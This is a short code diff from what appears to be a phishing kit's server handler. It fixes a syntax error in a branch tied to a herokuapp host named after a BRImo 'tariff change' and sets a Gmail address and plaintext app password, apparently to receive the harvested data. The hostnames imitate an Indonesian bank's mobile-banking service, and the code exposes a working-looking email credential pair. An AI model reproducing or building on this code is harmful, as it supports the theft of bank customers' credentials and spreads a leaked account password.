@@ -15,7 +15,7 @@ export default function handler(req, res) {
         
     } else if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
-        email = 'besarhasil47@gmail.com''; //email
+        email = 'besarhasil47@gmail.com'; //email
         pass = 'srpjniuzjggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if (url == 'formpilihan-tarif.herokuapp.com'){
